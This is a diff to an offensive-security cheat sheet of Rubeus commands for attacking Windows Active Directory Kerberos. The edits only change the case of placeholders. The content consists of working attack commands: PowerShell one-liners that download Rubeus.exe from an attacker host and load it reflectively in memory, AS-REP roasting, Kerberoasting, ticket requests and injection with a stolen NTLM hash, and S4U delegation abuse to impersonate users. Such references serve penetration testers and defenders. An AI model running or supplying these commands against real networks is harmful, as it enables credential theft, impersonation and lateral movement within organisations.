@@ -11,7 +11,7 @@
 ## load rubeus from powershell
 #plateform/windows #target/local #cat/UTILS 
 ```powershell
-$data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
+$data = (New-Object System.Net.WebClient).DownloadData('http://<LHOST>/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
 ```
 
 ## execute rubeus from powershell
@@ -41,7 +41,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## ASREPRoast specific user
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe asreproast  /user:<user> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file>
+.\Rubeus.exe asreproast  /user:<USER> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file>
 ```
 
 ## kerberoasting - current domain
@@ -71,13 +71,13 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## Kerberoast specific user account
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /user:<user> /simple
+.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /user:<USER> /simple
 ```
 
 ## get hash
 #plateform/windows #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```cmd
-.\Rubeus.exe hash /user:<user> /domain:<domain_name> /password:<password>
+.\Rubeus.exe hash /user:<USER> /domain:<domain_name> /password:<PASSWORD>
 ```
 
 ## dump - will dump any relevant cached TGS ticket’s stored
@@ -89,19 +89,19 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## ask and inject ticket
 #plateform/windows #target/remote #cat/ATTACK/CONNECT 
 ```
-.\Rubeus.exe asktgt /user:<user> /domain:<domain_name> /rc4:<ntlm_hash> /ptt
+.\Rubeus.exe asktgt /user:<USER> /domain:<domain_name> /rc4:<ntlm_hash> /ptt
 ```
 
 ## S4U - with ticket - Constrained delegation
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```
-.\Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<user> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt
+.\Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<USER> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt
 ```
 
 ## S4U - with hash - Constrained delegation
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```
-.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain_name> /ptt
+.\Rubeus.exe s4u /user:<USER> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain_name> /ptt
 ```
 
 ## get rc4 of machine with the password
@@ -119,7 +119,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## Rubeus Reflection assembly
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```powershell
-$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')  
+$data = (New-Object System.Net.WebClient).DownloadData('http://<IP>/Rubeus.exe')  
 $assem = [System.Reflection.Assembly]::Load($data)
 [Rubeus.Program]::Main('<rubeus_cmd>'.Split())
 ```
